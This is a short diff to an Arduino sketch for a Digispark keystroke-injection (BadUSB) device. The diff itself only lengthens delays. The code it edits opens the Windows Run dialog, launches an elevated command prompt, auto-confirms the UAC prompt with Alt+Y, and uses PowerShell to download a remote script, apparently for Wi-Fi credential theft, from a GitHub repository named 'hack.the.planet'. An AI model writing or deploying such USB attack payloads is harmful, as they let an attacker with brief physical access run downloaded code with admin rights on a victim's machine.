@@ -11,14 +11,14 @@ void loop() {
     // calling the sendKeyStroke() function with 0 starts the script, it cancels the effect of all keys that are already being pressed at the time of execution to avoid conflicts
     DigiKeyboard.sendKeyStroke(0);
     // waits before sending any other key strokes
-    DigiKeyboard.delay(250);    
+    DigiKeyboard.delay(500);    
     // Run as admin cmd
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // presses <WINDOWS> + R
-    DigiKeyboard.delay(500);    
+    DigiKeyboard.delay(1500);    
     DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
     DigiKeyboard.delay(1500);
     DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-    DigiKeyboard.delay(500);    
+    DigiKeyboard.delay(1500);    
 
     // Acties
     DigiKeyboard.println("powershell (New-Object System.Net.WebClient).DownloadFile(\\\"https://raw.githubusercontent.com/Opvolger/hack.the.planet/master/DigisparkWifi.cmd\\\", \\\"DigisparkWifi.cmd\\\")");
